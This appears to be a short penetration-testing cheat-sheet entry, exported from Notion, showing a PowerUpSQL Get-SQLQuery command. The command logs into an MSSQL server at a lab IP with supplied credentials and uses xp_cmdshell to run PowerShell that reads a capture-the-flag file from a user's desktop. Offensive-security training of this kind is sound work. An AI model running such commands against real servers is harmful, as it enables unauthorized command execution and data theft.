# PowerUp: SQL Query Execution: xp_cmdshell

OS: Active_Directory, Windows
Description: PowerUp: SQL Query Execution: xp_cmdshell
Security Domains: Execution (https://www.notion.so/Execution-1444c8e52376808b8c78d6d58e52f8a7?pvs=21)
Target_Technology: mssql (https://www.notion.so/mssql-1444c8e5237680f9abcfdf35bc047c00?pvs=21), PowerShell (https://www.notion.so/PowerShell-1434c8e52376805dba60efbabdb026bf?pvs=21)

```jsx
Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "TARGETDOMAIN\TARGETUSER" -password "SQL1234!" -query 'EXEC xp_cmdshell ''powershell -c cat c:\Users\damundsen\Desktop\flag.txt'''
```